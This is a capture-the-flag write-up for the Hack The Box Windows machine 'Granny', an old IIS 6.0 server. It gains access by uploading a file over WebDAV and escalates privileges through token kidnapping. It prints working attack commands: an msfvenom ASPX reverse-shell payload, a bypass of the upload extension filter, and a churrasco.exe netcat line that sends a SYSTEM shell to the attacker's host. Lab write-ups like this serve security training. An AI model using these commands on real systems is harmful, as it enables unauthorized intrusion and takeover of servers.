---
description: (Windows; Easy) 10.10.10.15
---

# Granny

## Nmap

```bash
# Nmap 7.93 scan initiated Mon Oct 24 18:50:00 2022 as: nmap -vvv -p 80 -Pn -A -oN granny.nmap 10.10.10.15
Nmap scan report for granny.htb (10.10.10.15)
Host is up, received user-set (0.024s latency).
Scanned at 2022-10-24 18:50:00 EDT for 15s

PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
| http-webdav-scan:
|   Server Date: Mon, 24 Oct 2022 22:50:10 GMT
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  WebDAV type: Unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=10/24%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=635716A7%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=0)
OPS(O1=M539NW0NNT00NNS%O2=M539NW0NNT00NNS%O3=M539NW0NNT00%O4=M539NW0NNT00NNS%O5=M539NW0NNT00NNS%O6=M539NNT00NNS)
WIN(W1=FAF0%W2=FAF0%W3=FAF0%W4=FAF0%W5=FAF0%W6=FAF0)
ECN(R=Y%DF=N%TG=80%W=FAF0%O=M539NW0NNS%CC=N%Q=)
T1(R=Y%DF=N%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=N%TG=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   25.31 ms 10.10.14.1
2   25.30 ms granny.htb (10.10.10.15)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 24 18:50:15 2022 -- 1 IP address (1 host up) scanned in 15.81 seconds
```

> Services running

Microsoft IIS 6.0 on port 80

## HTTP Port 80

<figure><img src="../../../.gitbook/assets/Pasted image 20221025171939.png" alt=""><figcaption></figcaption></figure>

### Web Fuzz

<figure><img src="../../../.gitbook/assets/Pasted image 20221025172111.png" alt=""><figcaption></figcaption></figure>

## Exploiting WebDav

Because the IIS server is running on an unsupported version, I decided to look into potential vulnerabilities, which led me to `WebDav`.

> WebDAV stands for Web Distributed Authoring and Versioning, which is an extension to HTTP that lets clients edit remote content on the web. In essence, WebDAV enables a web server to act as a file server, allowing authors to collaborate on web content. Source: https://www.cloudwards.net/what-is-webdav/

Two useful resources for exploit WebDav are:

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav" %}

{% embed url="https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718/" %}

You can tell what functions are avaiable based on the script scan from Nmap

<figure><img src="../../../.gitbook/assets/Pasted image 20221025174456.png" alt=""><figcaption></figcaption></figure>

Using the handy tool davtest:

```bash
davtest -url http://granny.htb
```

<figure><img src="../../../.gitbook/assets/Pasted image 20221025174307.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20221025174354.png" alt=""><figcaption></figcaption></figure>

So the PUT method works. One thing to note is the files we are allowed to upload and ones that can execute. Knowing this will save us time and unneccessary headaches when trying to get a reverse shell

You can also use cadaver, which allows us to interact with the WebDAV service similary to how you would with FTP. We'll take advantage of this to upload a reverse shell

First we test with PUT

```bash
cadaver http://granny.htb
```

<figure><img src="../../../.gitbook/assets/Pasted image 20221025174733.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20221025174935.png" alt=""><figcaption></figcaption></figure>

Now we'll upload a shell. Since .jsp and .php files cannot be executed, we will try a .aspx file, but since that's not allowed to be uploaded, we'll change the file type to .txt pre-upload and then rename it back post-upload.

## Initial Foothold

```bash
# generate revershell shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.25 LPORT=443 -f aspx -o shell.aspx

# change file type 
mv shell.aspx shell.txt

# upload file
put shell.txt

# rename file to original format
move shell.txt shell.aspx

# set up a listener to receive a hsell
nc -lnvp 443

# go to brower or use curl to execute shell.aspx
http://granny.htb/shell.aspx
```

<figure><img src="../../../.gitbook/assets/Pasted image 20221025184942.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20221025185023.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20221025185039.png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

```bash
Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 44 Minutes, 21 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 766 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,306 MB
Page File: In Use:         164 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```

Privledge escalation was a pain.

Because of how old the box is, most likely people will use Windows Exploit Suggester and similar. While you _could_ use this, it most likely will spit out hundreds of vulnerabilities. Even filtering will leave you with probably 50\~ There are a couple of things you could do and I'm sure there are a dozen ways to get `NT Authority\System` on this machine, but I chose this route:

First type `whoami && whoami /priv`

<figure><img src="../../../.gitbook/assets/Pasted image 20221028221539.png" alt=""><figcaption></figcaption></figure>

&#x20;Seeing this being enabled is very nice and comes in handy for the priv esc route I took.

I searched up on Google `windows server 2003 sp2 local privesc` which led me to this https://www.exploit-db.com/exploits/6705 You can review the presentation on TokenKidnapping [here](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)

> Basically if you can run code under any service in Win2k3 then you can own Windows, this is because Windows services accounts can impersonate. Other process (not services) that can impersonate are IIS 6 worker processes, so if you can run code from an ASP .NET or classic ASP web application then you can own Windows too.

So we see here that we're a network service account and this service account can impersonate, which means we can run some code that can make us `NT Authority\System`! You can get the .exe file [here](https://github.com/Re4son/Churrasco/) and learn how to use it for priv esc [here](https://medium.com/@nmappn/windows-privelege-escalation-via-token-kidnapping-6195edd2660e) I went for the route where I receive a reverse shell, so I uploaded nc and the binary using the same technique to get the initial foothold.

Before running the exploit, if you don't specify the exact path of where netcat is, then you'll see the following error&#x20;

<figure><img src="../../../.gitbook/assets/Pasted image 20221028221216.png" alt=""><figcaption></figcaption></figure>

Searching up the error led me to this post on stack overflow&#x20;

{% embed url="https://stackoverflow.com/questions/34924089/windows-7-netcat-error-nc-is-not-recognized-as-an-internal-or-external-comman" %}

After specifying the path, you should receive a callback

```bash
churrasco.exe "c:\inetpub\wwwroot\nc.exe 10.10.14.4 443 -e cmd.exe"
```

<figure><img src="../../../.gitbook/assets/Pasted image 20221028215839.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Pasted image 20221028221419.png" alt=""><figcaption></figcaption></figure>
